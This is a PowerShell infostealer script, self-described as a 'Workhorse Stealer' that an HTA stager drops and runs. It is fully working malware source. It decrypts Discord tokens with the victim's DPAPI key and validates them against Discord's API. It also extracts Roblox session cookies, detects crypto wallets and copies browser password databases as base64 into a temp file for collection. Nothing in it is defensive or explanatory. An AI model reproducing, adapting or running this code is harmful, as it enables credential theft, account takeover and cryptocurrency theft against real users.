# ============================================================
#  STEAL.PS1  —  Workhorse Stealer
#  Dropped & executed by the HTA stager.
#  Writes all results to %TEMP%\steal_result.txt
# ============================================================
#  PLACEHOLDERS: none needed in this file.
#  This file gets hosted somewhere the HTA can reach.
#  Replace <<<YOUR_PS1_HOSTING_URL>>> in the HTA with that URL.
# ============================================================

Add-Type -AssemblyName System.Security

# --- Custom AES-ECB counter-mode decryptor for Discord tokens ---
$csharp = @"
using System;
using System.Security.Cryptography;
public class Gcm {
    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct) {
        using (var aes = Aes.Create()) {
            aes.Key = key; aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.None;
            byte[] o = new byte[ct.Length];
            byte[] c = new byte[16]; Array.Copy(nonce, c, 12); c[15] = 2;
            using (var e = aes.CreateEncryptor()) {
                for (int i = 0; i < ct.Length; i += 16) {
                    byte[] k = e.TransformFinalBlock(c, 0, 16);
                    int n = Math.Min(16, ct.Length - i);
                    for (int j = 0; j < n; j++) o[i + j] = (byte)(ct[i + j] ^ k[j]);
                    for (int j = 15; j >= 12; j--) { if (++c[j] != 0) break; }
                }
            }
            return o;
        }
    }
}
"@
Add-Type -TypeDefinition $csharp -Language CSharp

$outfile = Join-Path $env:TEMP "steal_result.txt"
Remove-Item $outfile -EA SilentlyContinue

# ============================================================
#  DISCORD TOKEN EXTRACTION
# ============================================================

# Unwrap the master key from Discord's Local State (DPAPI-protected)
$mk = $null
try {
    $localState = Get-Content "$env:APPDATA\discord\Local State" -Raw | ConvertFrom-Json
    $b = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
    $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
} catch {}

$tokens = @{}
$discordPaths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb"
)

foreach ($dp in $discordPaths) {
    if (!(Test-Path $dp)) { continue }
    Get-ChildItem $dp | Where-Object { $_.Name -match '\.(ldb|log)$' } | ForEach-Object {
        $raw = $null
        try {
            $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
            $sr = New-Object IO.StreamReader($fs)
            $raw = $sr.ReadToEnd()
            $sr.Close(); $fs.Close()
        } catch { return }
        if (!$raw -or !$mk) { return }

        # Discord's known token prefix in leveldb
        foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {
            $b64 = $m.Groups[1].Value
            while ($b64.Length % 4 -ne 0) { $b64 += '=' }
            try {
                $eb = [Convert]::FromBase64String($b64)
                if ($eb.Length -lt 80) { continue }
                $t = [Text.Encoding]::UTF8.GetString([Gcm]::Decrypt($mk, $eb[3..14], $eb[15..($eb.Length-17)])).TrimEnd([char]0)
                if ($t.Length -gt 40 -and !$tokens[$t]) {
                    $tokens[$t] = $t
                }
            } catch {}
        }
    }
}

# Validate tokens against Discord API
foreach ($t in $tokens.Keys) {
    try {
        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' `
            -Headers @{'Authorization'=$t} -TimeoutSec 5
        if ($r.username) {
            Add-Content $outfile "DISCORD|$($r.username)|$($r.email)|$($r.phone)|$($r.id)|$t"
        }
    } catch {}
}

# ============================================================
#  ROBLOX COOKIE EXTRACTION
# ============================================================

$rbxPaths = @(
    "$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat",
    "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat",
    "$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat",
    "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
)

foreach ($rp in $rbxPaths) {
    if (!(Test-Path $rp)) { continue }
    try {
        $raw = Get-Content $rp -Raw
        if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
            $eb = [Convert]::FromBase64String($Matches[1])
            $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
            $cookie = [Text.Encoding]::UTF8.GetString($db)
            if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
                Add-Content $outfile "ROBLOX|$($Matches[1])"
            } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
                Add-Content $outfile "ROBLOX|$($Matches[0])"
            } else {
                Add-Content $outfile "ROBLOX|$($cookie.Substring(0,[Math]::Min(500,$cookie.Length)))"
            }
        } elseif ($raw -match '\.ROBLOSECURITY') {
            Add-Content $outfile "ROBLOX|$raw"
        }
    } catch {}
    break
}

# UWP / Microsoft Store Roblox
$pkgPath = "$env:LOCALAPPDATA\Packages"
if (Test-Path $pkgPath) {
    $gdks = Get-ChildItem "$pkgPath\ROBLOXCorporation.RobloxGDK_*" -Directory -EA SilentlyContinue
    foreach ($gdk in $gdks) {
        $cp = Join-Path $gdk.FullName "LocalState\RobloxCookies.dat"
        if (!(Test-Path $cp)) { continue }
        try {
            $raw = Get-Content $cp -Raw
            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
                $eb = [Convert]::FromBase64String($Matches[1])
                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                $cookie = [Text.Encoding]::UTF8.GetString($db)
                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
                    Add-Content $outfile "ROBLOXMS|$($Matches[1])"
                } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
                    Add-Content $outfile "ROBLOXMS|$($Matches[0])"
                } else {
                    Add-Content $outfile "ROBLOXMS|$($cookie.Substring(0,[Math]::Min(500,$cookie.Length)))"
                }
            }
        } catch {}
        break
    }
}

# ============================================================
#  CRYPTO WALLET DETECTION
# ============================================================

$desktopWallets = @{
    Exodus  = "$env:APPDATA\Exodus"
    Atomic  = "$env:APPDATA\atomic"
    Electrum= "$env:APPDATA\Electrum"
    Jaxx    = "$env:APPDATA\jaxx"
    Guarda  = "$env:APPDATA\Guarda"
    Coinomi = "$env:APPDATA\Coinomi"
    Armory  = "$env:APPDATA\Armory"
}

$browserWallets = @{
    MetaMask      = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
    Phantom       = 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
    Ronin         = 'fnjhmkhhmkbjkkabndcnnogagogbneec'
    BinanceChain  = 'fhbohimaelbohpjbbldcngcnapndodjp'
    Coinbase      = 'hnfanknocfeofbddgcijnmhfnkdnaad'
    TrustWallet   = 'egjidjbpglichdcondbcbdnbeeppgdph'
    TronLink      = 'ibnejdfjmmkpcnlpebklmnkoeoihofec'
}

$browserRoots = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "$env:APPDATA\Opera Software\Opera Stable"
)

foreach ($n in $desktopWallets.Keys) {
    if (Test-Path $desktopWallets[$n]) {
        Add-Content $outfile "WALLET|$n|desktop"
    }
}

foreach ($n in $browserWallets.Keys) {
    foreach ($bp in $browserRoots) {
        $ep = Join-Path $bp "Default\Local Extension Settings\$($browserWallets[$n])"
        if (Test-Path $ep) {
            Add-Content $outfile "WALLET|$n|browser"
            break
        }
    }
}

# ============================================================
#  BROWSER PASSWORD DATABASE EXFIL
# ============================================================

$browsers = @(
    @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data"}
    @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data"}
    @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
    @{Name="Opera";   Path="$env:APPDATA\Opera Software\Opera Stable"}
    @{Name="OperaGX"; Path="$env:APPDATA\Opera Software\Opera GX Stable"}
)

foreach ($br in $browsers) {
    if (!(Test-Path $br.Path)) { continue }
    $lp = Join-Path $br.Path "Default\Login Data"
    if (!(Test-Path $lp)) { $lp = Join-Path $br.Path "Login Data" }
    if (!(Test-Path $lp)) { continue }

    $copied = $false
    $tmp = Join-Path $env:TEMP "ld_$([Guid]::NewGuid()).db"
    try {
        $fs = [IO.File]::Open($lp, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
        $ms = New-Object IO.MemoryStream
        $fs.CopyTo($ms); $fs.Close()
        [IO.File]::WriteAllBytes($tmp, $ms.ToArray())
        $ms.Close(); $copied = $true
    } catch {}

    if (!$copied) {
        Add-Content $outfile "PASSWORD|$($br.Name)|LOCKED||"
        continue
    }

    try {
        $rawBytes = [IO.File]::ReadAllBytes($tmp)
        if ($rawBytes.Length -gt 800000) {
            Add-Content $outfile "PASSWORD|$($br.Name)|TOO_LARGE|$($rawBytes.Length)|"
        } else {
            $b64 = [Convert]::ToBase64String($rawBytes)
            Add-Content $outfile "PASSWORD|$($br.Name)|RAW_DB||$b64"
        }
    } catch {
        Add-Content $outfile "PASSWORD|$($br.Name)|READ_ERROR||"
    }
    Remove-Item $tmp -Force -EA SilentlyContinue
}